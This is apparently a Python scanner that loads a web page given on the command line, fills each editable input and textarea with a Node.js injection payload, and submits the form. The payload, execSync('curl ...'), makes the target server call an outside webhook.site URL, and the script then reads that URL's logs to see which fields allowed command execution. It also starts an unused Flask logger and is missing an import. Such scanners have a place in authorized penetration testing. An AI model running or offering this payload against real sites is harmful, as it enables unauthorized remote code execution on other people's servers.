import subprocess
import time
import socket
import argparse
import requests
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager

def is_port_available(port):
    """Check if a port is available."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) != 0

def create_webhook_url():
    """Create a new Webhook.site URL."""
    response = requests.post("https://webhook.site/token", headers={"Accept": "application/json"})
    data = response.json()
    return data['uuid'], f"https://webhook.site/{data['uuid']}"

def write_flask_app_script(port):                                                                 
    """Write the Flask app script to a file."""
    flask_app_script = f"""
from flask import Flask, request

app = Flask(__name__) 

@app.route('/input', methods=['GET'])
def log_data():
    input_id = request.args.get('id')
    print(f"Highly probable exploit via input with ID: {{input_id}}")
    return "OK"

if __name__ == '__main__':
    app.run(port={port})     
"""
    with open('flask_app.py', 'w') as f:
        f.write(flask_app_script)

def start_flask_server():
    """Start the Flask server in a subprocess."""
    return subprocess.Popen(['python', 'flask_app.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def initialize_webdriver():
    """Initialize the Selenium WebDriver."""
    try:
        driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()))
        return driver
    except Exception as e:
        print(f"Failed to initialize WebDriver. Ensure geckodriver is installed and in PATH. Error: {e}")
        sys.exit(1)

def process_input_elements(driver, webhook_url):
    """Process input elements on the webpage."""
    input_elements = driver.find_elements(By.TAG_NAME, 'input')
    text_area_elements = driver.find_elements(By.TAG_NAME, 'textarea')
    all_elements = input_elements + text_area_elements

    for index, element in enumerate(all_elements, start=1):
        if element.is_enabled() and element.get_attribute('readonly') is None and element.get_attribute('type') not in ['checkbox', 'radio', 'hidden', 'file', 'submit', 'reset']:
            element_id = element.get_attribute('id')
            print(f"Processing element with ID: {element_id}")
            payload = f"a = this.process.mainModule.require('child_process').execSync('curl {webhook_url}?id={element_id}')"
            element.clear()
            element.send_keys(payload)

def click_submit_button(driver):
    """Find and click the submit button."""
    try:
        submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        ActionChains(driver).move_to_element(submit_button).click().perform()
    except Exception as e:
        print(f"Failed to click the submit button: {e}")

def get_webhook_requests(webhook_uuid):
    """Retrieve requests sent to the Webhook URL."""
    response = requests.get(f"https://webhook.site/token/{webhook_uuid}/requests", headers={"Accept": "application/json"})
    requests_data = response.json()['data']
    return requests_data

def extract_query_params(requests_data):
    """Extract query parameters from the requests."""
    query_params = []
    for req in requests_data:
        query_string = req['query']
        query_params.append(query_string)
    return query_params

def main():
    # Parse the URL and port from the command line
    parser = argparse.ArgumentParser(
        description='Script to interact with a webpage and log input IDs.',
        epilog="Example usage:\n"
               "  python script_name.py -l http://example.com -p 5000",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-l', '--url', type=str, required=True, help='The URL of the web page to scrape.')
    parser.add_argument('-p', '--port', type=int, required=True, help='The port for the Flask app.')
    
    args = parser.parse_args()
    url = args.url
    port = args.port

    # Check if the specified port is available
    if not is_port_available(port):
        print(f"Port {port} is not available. Please choose a different port.")
        exit(1)

    # Write the Flask app script to a file
    write_flask_app_script(port)

    # Start the Flask server in a subprocess
    flask_process = start_flask_server()

    # Wait a few seconds to ensure the Flask server is up and running
    time.sleep(5)

    # Create a new Webhook.site URL
    webhook_uuid, webhook_url = create_webhook_url()
    print(f"Webhook URL: {webhook_url}")

    # Initialize the Selenium WebDriver
    driver = initialize_webdriver()
    driver.get(url)

    # Process input elements and send payloads
    process_input_elements(driver, webhook_url)

    # Click the submit button
    click_submit_button(driver)

    # Optionally, wait for a bit to see the result
    driver.implicitly_wait(5)

    # Close the browser
    driver.quit()

    # Retrieve and print query parameters from the requests sent to the Webhook URL
    webhook_requests = get_webhook_requests(webhook_uuid)
    query_params = extract_query_params(webhook_requests)
    print("Query parameters received by the Webhook URL:")
    for query in query_params:
        print(query)

    # Terminate the Flask server process
    flask_process.terminate()

if __name__ == "__main__":
    main()
